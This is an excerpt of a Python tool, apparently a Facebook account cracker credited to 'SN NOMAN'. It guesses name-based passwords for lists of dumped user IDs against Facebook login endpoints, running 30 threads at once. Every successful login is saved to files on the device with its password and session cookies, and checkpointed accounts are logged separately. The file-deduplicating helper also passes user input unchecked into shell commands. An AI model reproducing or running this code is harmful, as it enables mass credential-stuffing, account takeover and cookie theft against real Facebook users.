...
\033[1;37m  
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            SN NOMAN
\033[1;37m Facebook:          SN NOMAN
\033[1;37m Github  :            SN-111
\033[1;37m Version :            0.1.1
\033[1;37m------------------------------------------------ """
def clear():
    os.system("clear")
    print(logo)    
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back SN Menu ")
        exit()
...
def noman():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://facebook.com/groups/927931148895937/')
        pass
    elif select =='F':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100002560526909')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        SSB(allkey)
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sn={sn};{ckkk}"
                    print(f"\r{R} [SN-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SN_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [SSB-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/SN_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [SSB-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SN_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SN_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [SSB-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[SN] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [SN-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SN_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    #print(f"\r{A} [SN-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/SN_CP.txt','a').write(sid+'|'+ps+'\n')
                    break
                else:
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with nomansn(max_workers=30) as snworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
...
def cutter():
    ...
    sn = input('Put File Name :')
    print(" ")
    noman = input('Saving Put File Name :')
    os.system('touch ' +noman)
    os.system('sort -r '+sn+' | uniq > '+noman)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + sn )
    print(47*'-')
    print("File Saved To :" + noman )
    print(47*'-')
    input(f"{S} Press Enter To Back SN Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/SN.txt\n') 
        filepath = input("Put File Name: ")
...
def cutter():
    ...
    print(" ")
    sn = input('Saving Put File Name:')
    os.system('touch ' +noman)
    os.system('sort -r '+sn+' | uniq > '+noman)
    os.system('clear')
    print(logo)
    print("Removed Successful From File: " + sn )
    print("New File Saved:" + noman )
    print(47*'-')
    input(f"{S} Press Enter To Back SN Menu ")
    SN(allkey)       
